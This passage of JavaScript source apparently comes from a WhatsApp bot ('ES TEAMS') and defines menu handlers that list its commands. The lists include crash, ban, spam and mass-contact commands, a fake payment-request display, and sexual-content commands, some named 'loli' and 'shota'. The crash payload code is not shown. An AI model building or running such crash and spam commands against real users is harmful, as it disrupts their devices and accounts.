┃ ${setv} ${prefix}goose 🅕
┃ ${setv} ${prefix}woof 🅕
┃ ${setv} ${prefix}8ball 🅕
┃ ${setv} ${prefix}lizard 🅕
┃ ${setv} ${prefix}meow 🅕
┃ ${setv} ${prefix}gura 🅕
┃ ${setv} ${prefix}telestick 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐀𝐍𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}searchanime 🅕
┃ ${setv} ${prefix}animeinfo 🅕
┃ ${setv} ${prefix}animeid 🅕
┃ ${setv} ${prefix}animedl 🅕
┃ ${setv} ${prefix}searchmanga 🅕
┃ ${setv} ${prefix}amv 🅕
┃ ${setv} ${prefix}mangainfo 🅕
┃ ${setv} ${prefix}searchchapter 🅕
┃ ${setv} ${prefix}mangachapter 🅕
┃ ${setv} ${prefix}randommanga 🅕
┃ ${setv} ${prefix}stickhandhold 🅕
┃ ${setv} ${prefix}stickshinobu 🅕
┃ ${setv} ${prefix}stickcuddle 🅕
┃ ${setv} ${prefix}stickhighfive 🅕
┃ ${setv} ${prefix}stickdance 🅕
┃ ${setv} ${prefix}stickcringe 🅕
┃ ${setv} ${prefix}stickhappy 🅕
┃ ${setv} ${prefix}stickglomp 🅕
┃ ${setv} ${prefix}sticksmug 🅕
┃ ${setv} ${prefix}stickblush 🅕
┃ ${setv} ${prefix}stickawoo 🅕
┃ ${setv} ${prefix}stickwave 🅕
┃ ${setv} ${prefix}sticksmile 🅕
┃ ${setv} ${prefix}stickslap 🅕
┃ ${setv} ${prefix}stickpoke 🅕
┃ ${setv} ${prefix}stickwink 🅕
┃ ${setv} ${prefix}stickbonk 🅕
┃ ${setv} ${prefix}stickbully 🅕
┃ ${setv} ${prefix}stickyeet 🅕
┃ ${setv} ${prefix}stickbike 🅕
┃ ${setv} ${prefix}stickkiss 🅕
┃ ${setv} ${prefix}sticklick 🅕
┃ ${setv} ${prefix}stickpat 🅕
┃ ${setv} ${prefix}stickhug 🅕
┃ ${setv} ${prefix}stickkill 🅕
┃ ${setv} ${prefix}stickcry 🅕
┃ ${setv} ${prefix}stickspank 🅕
┃ ${setv} ${prefix}sticktickle 🅕
┃ ${setv} ${prefix}traceanime 🅕
┃ ${setv} ${prefix}akira 🅕
┃ ${setv} ${prefix}akiyama 🅕
┃ ${setv} ${prefix}ana 🅕
┃ ${setv} ${prefix}asuna 🅕
┃ ${setv} ${prefix}ayuzawa 🅕
┃ ${setv} ${prefix}boruto 🅕
┃ ${setv} ${prefix}chiho 🅕
┃ ${setv} ${prefix}chitoge 🅕
┃ ${setv} ${prefix}cosplayloli 🅕
┃ ${setv} ${prefix}cosplaysagiri 🅕
┃ ${setv} ${prefix}deidara 🅕
┃ ${setv} ${prefix}doraemon 🅕
┃ ${setv} ${prefix}elaina 🅕
┃ ${setv} ${prefix}emilia 🅕
┃ ${setv} ${prefix}erza 🅕
┃ ${setv} ${prefix}gremory 🅕
┃ ${setv} ${prefix}hestia 🅕
┃ ${setv} ${prefix}husbu 🅕
┃ ${setv} ${prefix}inori 🅕
┃ ${setv} ${prefix}isuzu 🅕
┃ ${setv} ${prefix}itachi 🅕
┃ ${setv} ${prefix}itori 🅕
┃ ${setv} ${prefix}kaga 🅕
┃ ${setv} ${prefix}kagura 🅕
┃ ${setv} ${prefix}kakasih 🅕
┃ ${setv} ${prefix}kaori 🅕
┃ ${setv} ${prefix}keneki 🅕
┃ ${setv} ${prefix}kotori 🅕
┃ ${setv} ${prefix}kurumi 🅕
┃ ${setv} ${prefix}loli 🅕
┃ ${setv} ${prefix}loli2 🅕
┃ ${setv} ${prefix}madara 🅕
┃ ${setv} ${prefix}megumin 🅕
┃ ${setv} ${prefix}mikasa 🅕
┃ ${setv} ${prefix}mikey 🅕
┃ ${setv} ${prefix}miku 🅕
┃ ${setv} ${prefix}minato 🅕
┃ ${setv} ${prefix}naruto 🅕
┃ ${setv} ${prefix}neko 🅕
┃ ${setv} ${prefix}nekonime 🅕
┃ ${setv} ${prefix}nezuko 🅕
┃ ${setv} ${prefix}onepiece 🅕
┃ ${setv} ${prefix}pokemon 🅕
┃ ${setv} ${prefix}randomnime 🅕
┃ ${setv} ${prefix}randomnime2 🅕
┃ ${setv} ${prefix}rize 🅕
┃ ${setv} ${prefix}sagiri 🅕
┃ ${setv} ${prefix}sakura 🅕
┃ ${setv} ${prefix}sasuke 🅕
┃ ${setv} ${prefix}shina 🅕
┃ ${setv} ${prefix}shinka 🅕
┃ ${setv} ${prefix}shinomiya 🅕
┃ ${setv} ${prefix}shizuka 🅕
┃ ${setv} ${prefix}shota 🅕
┃ ${setv} ${prefix}tejina 🅕
┃ ${setv} ${prefix}toukachan 🅕
┃ ${setv} ${prefix}tsunade 🅕
┃ ${setv} ${prefix}waifu 🅕
┃ ${setv} ${prefix}waifu2 🅕
┃ ${setv} ${prefix}animewall 🅕
┃ ${setv} ${prefix}yotsuba 🅕
┃ ${setv} ${prefix}yuki 🅕
┃ ${setv} ${prefix}yulibocil 🅕
┃ ${setv} ${prefix}yumeko 🅕
┃ ${setv} ${prefix}8ball 🅕
┃ ${setv} ${prefix}animeawoo 🅕
┃ ${setv} ${prefix}animemegumin 🅕
┃ ${setv} ${prefix}animeshinobu 🅕
┃ ${setv} ${prefix}animehandhold 🅕
┃ ${setv} ${prefix}animehighfive 🅕
┃ ${setv} ${prefix}animecringe 🅕
┃ ${setv} ${prefix}animedance 🅕
┃ ${setv} ${prefix}animehappy 🅕
┃ ${setv} ${prefix}animeglomp 🅕
┃ ${setv} ${prefix}animeblush 🅕
┃ ${setv} ${prefix}animesmug 🅕
┃ ${setv} ${prefix}animewave 🅕
┃ ${setv} ${prefix}animesmille 🅕
┃ ${setv} ${prefix}animepoke 🅕
┃ ${setv} ${prefix}animewink 🅕
┃ ${setv} ${prefix}animebonk 🅕
┃ ${setv} ${prefix}animebully 🅕
┃ ${setv} ${prefix}animeyeet 🅕
┃ ${setv} ${prefix}animebite 🅕
┃ ${setv} ${prefix}animelick 🅕
┃ ${setv} ${prefix}animekill 🅕
┃ ${setv} ${prefix}animecry 🅕
┃ ${setv} ${prefix}animewlp 🅕
┃ ${setv} ${prefix}animekiss 🅕
┃ ${setv} ${prefix}animehug 🅕
┃ ${setv} ${prefix}animeneko 🅕
┃ ${setv} ${prefix}animepat 🅕
┃ ${setv} ${prefix}animeslap 🅕
┃ ${setv} ${prefix}animecuddle 🅕
┃ ${setv} ${prefix}animewaifu 🅕
┃ ${setv} ${prefix}animenom 🅕
┃ ${setv} ${prefix}animefoxgirl 🅕
┃ ${setv} ${prefix}animegecg 🅕
┃ ${setv} ${prefix}animeuwu 🅕
┃ ${setv} ${prefix}animeblush 🅕
┃ ${setv} ${prefix}animehugs 🅕
┃ ${setv} ${prefix}animejump 🅕
┃ ${setv} ${prefix}animefacepalm 🅕
┃ ${setv} ${prefix}animepout 🅕
┃ ${setv} ${prefix}animepat 🅕
┃ ${setv} ${prefix}animekiss 🅕
┃ ${setv} ${prefix}animecuddle 🅕
┃ ${setv} ${prefix}animepunch 🅕
┃ ${setv} ${prefix}animebite 🅕
┃ ${setv} ${prefix}animewink 🅕
┃ ${setv} ${prefix}animehug 🅕
┃ ${setv} ${prefix}animekick 🅕
┃ ${setv} ${prefix}animelaugh 🅕
┃ ${setv} ${prefix}animepunch 🅕
┃ ${setv} ${prefix}animeblow 🅕
┃ ${setv} ${prefix}animefeed 🅕
┃ ${setv} ${prefix}animelove 🅕
┃ ${setv} ${prefix}animeawe 🅕
┃ ${setv} ${prefix}animehug 🅕
┃ ${setv} ${prefix}animeconfused 🅕
┃ ${setv} ${prefix}animecalm 🅕
┃ ${setv} ${prefix}animepout 🅕
┃ ${setv} ${prefix}animeangry 🅕
┃ ${setv} ${prefix}animework 🅕
┃ ${setv} ${prefix}animeblush 🅕
┃ ${setv} ${prefix}animegrin 🅕
┃ ${setv} ${prefix}animehappy 🅕
┃ ${setv} ${prefix}animemiss 🅕
┃ ${setv} ${prefix}animefix 🅕
┃ ${setv} ${prefix}animedeep 🅕
┃ ${setv} ${prefix}animegrumpy 🅕
┃ ${setv} ${prefix}animefacepalm 🅕
┃ ${setv} ${prefix}animewhisper 🅕
┃ ${setv} ${prefix}animehug 🅕
╰━━━━━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐀𝐍𝐈𝐌𝐄 𝐍𝐒𝐅𝐖\` 】❄️━━━━━╮
┃ ${setv} ${prefix}hentai 🅕
┃ ${setv} ${prefix}xnxxsearch 🅕
┃ ${setv} ${prefix}xvideosearch 🅕
┃ ${setv} ${prefix}xnxxdl 🅕
┃ ${setv} ${prefix}xvideodl 🅕
┃ ${setv} ${prefix}gifblowjob 🅕
┃ ${setv} ${prefix}hentaivid 🅕
┃ ${setv} ${prefix}hneko 🅕
┃ ${setv} ${prefix}nwaifu 🅕
┃ ${setv} ${prefix}animespank 🅕
┃ ${setv} ${prefix}trap 🅕
┃ ${setv} ${prefix}blowjob 🅕
┃ ${setv} ${prefix}cuckold 🅕
┃ ${setv} ${prefix}milf 🅕
┃ ${setv} ${prefix}eba 🅕
┃ ${setv} ${prefix}pussy 🅕
┃ ${setv} ${prefix}yuri 🅕
┃ ${setv} ${prefix}zettai 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}setcmd 🅞
┃ ${setv} ${prefix}delcmd 🅞
┃ ${setv} ${prefix}listcmd 🅕
┃ ${setv} ${prefix}lockcmd 🅞
┃ ${setv} ${prefix}addmsg 🅞
┃ ${setv} ${prefix}delmsg 🅞
┃ ${setv} ${prefix}getmsg 🅕
┃ ${setv} ${prefix}listmsg 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\` 】❄️━╮
┃ ${setv} ${prefix}esteams-dtbs 🅞
┃ ${setv} ${prefix}add-dtbs 🅞
┃ ${setv} ${prefix}del-dtbs 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐁𝐀𝐍\` 】❄️━━━━━╮
┃ ${setv} ${prefix}esteams-ban1
┃ ${setv} ${prefix}esteams-ban2
┃ ${setv} ${prefix}esteams-ban3
┃ ${setv} ${prefix}esteams-ban4
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐂𝐑𝐀𝐒𝐇\` 】❄️━━━╮
┃ ${setv} ${prefix}esteams-invicrash 🅞
┃ ${setv} ${prefix}esteams-midcrash 🅞
┃ ${setv} ${prefix}esteams-hardcrash 🅞
┃ ${setv} ${prefix}esteams-infinitecrash 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐓𝐎𝐑𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}list 🅕
┃ ${setv} ${prefix}store 🅕
┃ ${setv} ${prefix}shop 🅕
┃ ${setv} ${prefix}addlist 🅞
┃ ${setv} ${prefix}dellist 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐑𝐄𝐋𝐈𝐆𝐈𝐎𝐍\` 】❄️━━━━━╮
┃ ${setv} ${prefix}bible 🅕
┃ ${setv} ${prefix}quran 🅕
┃ ${setv} ${prefix}gita 🅕
┃ ${setv} ${prefix}namazchk 🅕
┃ ${setv} ${prefix}prophetname 🅕
┃ ${setv} ${prefix}prayertime 🅕
┃ ${setv} ${prefix}sahihbukhari 🅕
┃ ${setv} ${prefix}jamiattirmidhi 🅕
┃ ${setv} ${prefix}sunanannasai 🅕
┃ ${setv} ${prefix}sunanibnmajah 🅕
┃ ${setv} ${prefix}sunanabudawud 🅕
┃ ${setv} ${prefix}kisahnabi 🅕
┃ ${setv} ${prefix}asmaulhusna 🅕
┃ ${setv} ${prefix}duas 🅕
┃ ${setv} ${prefix}namaz 🅕
┃ ${setv} ${prefix}masnoonduas 🅕
┃ ${setv} ${prefix}ayatalkursi 🅕
┃ ${setv} ${prefix}niyatnamaz 🅕
┃ ${setv} ${prefix}quotesislami 🅕
┃ ${setv} ${prefix}assalamualaikum 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐎𝐓𝐇𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}update 🅕
┃ ${setv} ${prefix}cricket 🅕
┃ ${setv} ${prefix}score 🅕
┃ ${setv} ${prefix}ping 🅕
┃ ${setv} ${prefix}menu 🅕
┃ ${setv} ${prefix}myip 🅕
┃ ${setv} ${prefix}repo 🅕
┃ ${setv} ${prefix}reportbug 🅕
┃ ${setv} ${prefix}idgroup 🅕
┃ ${setv} ${prefix}owner 🅕
┃ ${setv} ${prefix}rentbot 🅕
┃ ${setv} ${prefix}donate 🅕
┃ ${setv} ${prefix}runtime 🅕
┃ ${setv} ${prefix}confess 🅕
┃ ${setv} ${prefix}react 🅕
┃ ${setv} ${prefix}q 🅕
┃ ${setv} ${prefix}inspect 🅕
┃ ${setv} ${prefix}tagme 🅕
┃ ${setv} ${prefix}nowa 🅕
┃ ${setv} ${prefix}truecaller 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'ownermenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐎𝐖𝐍𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}addbadword 🅞
┃ ${setv} ${prefix}esteams-update 🅞
┃ ${setv} ${prefix}delbadword 🅞
┃ ${setv} ${prefix}autoread 🅞
┃ ${setv} ${prefix}set-payment 🅞
┃ ${setv} ${prefix}esteams-payment 🅞
┃ ${setv} ${prefix}esteamsnew-menu 🅞
┃ ${setv} ${prefix}autobio 🅞
┃ ${setv} ${prefix}databasemenu 🅞
┃ ${setv} ${prefix}autotype 🅞
┃ ${setv} ${prefix}unavailable 🅞
┃ ${setv} ${prefix}autorecord 🅞
┃ ${setv} ${prefix}esteams-ip 🅞
┃ ${setv} ${prefix}autorecordtype 🅞
┃ ${setv} ${prefix}autoswview 🅞
┃ ${setv} ${prefix}setautoblock 🅞
┃ ${setv} ${prefix}setantiforeign 🅞
┃ ${setv} ${prefix}autoblock 🅞
┃ ${setv} ${prefix}onlygc 🅞
┃ ${setv} ${prefix}onlypc 🅞
┃ ${setv} ${prefix}onlyindia 🅞
┃ ${setv} ${prefix}onlyindo 🅞
┃ ${setv} ${prefix}anticall 🅞
┃ ${setv} ${prefix}self 🅞
┃ ${setv} ${prefix}public 🅞
┃ ${setv} ${prefix}join 🅞
┃ ${setv} ${prefix}poll 🅞
┃ ${setv} ${prefix}spam 🅞
┃ ${setv} ${prefix}bc 🅞
┃ ${setv} ${prefix}bcgroup 🅞
┃ ${setv} ${prefix}setmenu 🅞
┃ ${setv} ${prefix}setimgmenu 🅞
┃ ${setv} ${prefix}setvidmenu 🅞
┃ ${setv} ${prefix}setgifmenu 🅞
┃ ${setv} ${prefix}setreply 🅞
┃ ${setv} ${prefix}resethit 🅞
┃ ${setv} ${prefix}resetuser 🅞
┃ ${setv} ${prefix}creategc 🅞
┃ ${setv} ${prefix}setexif 🅞
┃ ${setv} ${prefix}getexif 🅞
┃ ${setv} ${prefix}getautoblocknumber 🅞
┃ ${setv} ${prefix}getantiforeignnumber 🅞
┃ ${setv} ${prefix}userjid 🅞
┃ ${setv} ${prefix}setbotbio 🅞
┃ ${setv} ${prefix}delppbot 🅞
┃ ${setv} ${prefix}shutdown 🅞
┃ ${setv} ${prefix}setppbot 🅞
┃ ${setv} ${prefix}addprem 🅞
┃ ${setv} ${prefix}delprem 🅞
┃ ${setv} ${prefix}addowner 🅞
┃ ${setv} ${prefix}delowner 🅞
┃ ${setv} ${prefix}addvn 🅞
┃ ${setv} ${prefix}addapk 🅞
┃ ${setv} ${prefix}addzip 🅞
┃ ${setv} ${prefix}addpdf 🅞
┃ ${setv} ${prefix}delapk 🅞
┃ ${setv} ${prefix}delzip 🅞
┃ ${setv} ${prefix}delpdf 🅞
┃ ${setv} ${prefix}delvn 🅞
┃ ${setv} ${prefix}addsticker 🅞
┃ ${setv} ${prefix}delsticker 🅞
┃ ${setv} ${prefix}addimage 🅞
┃ ${setv} ${prefix}delimage 🅞
┃ ${setv} ${prefix}addvideo 🅞
┃ ${setv} ${prefix}delvideo 🅞
┃ ${setv} ${prefix}upswtext 🅞
┃ ${setv} ${prefix}upswvideo 🅞
┃ ${setv} ${prefix}upswimage 🅞
┃ ${setv} ${prefix}upswaudio 🅞
┃ ${setv} ${prefix}autosticker 🅞
┃ ${setv} ${prefix}block 🅞
┃ ${setv} ${prefix}unblock 🅞
┃ ${setv} ${prefix}leavegc 🅞
┃ ${setv} ${prefix}pushcontact 🅞
┃ ${setv} ${prefix}pushcontactv2 🅞
┃ ${setv} ${prefix}pushcontactv3 🅞
┃ ${setv} ${prefix}jpm 🅞
┃ ${setv} ${prefix}checkmember 🅞
┃ ${setv} ${prefix}post 🅞
┃ ${setv} ${prefix}clearchat 🅞
┃ ${setv} ${prefix}setprefix 🅞
┃ ${setv} $ 🅞
┃ ${setv} > 🅞
┃ ${setv} < 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'databasemenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\` 】❄️━╮
┃ ${setv} ${prefix}esteams-dtbs 🅞
┃ ${setv} ${prefix}add-dtbs 🅞
┃ ${setv} ${prefix}del-dtbs 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'crashmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
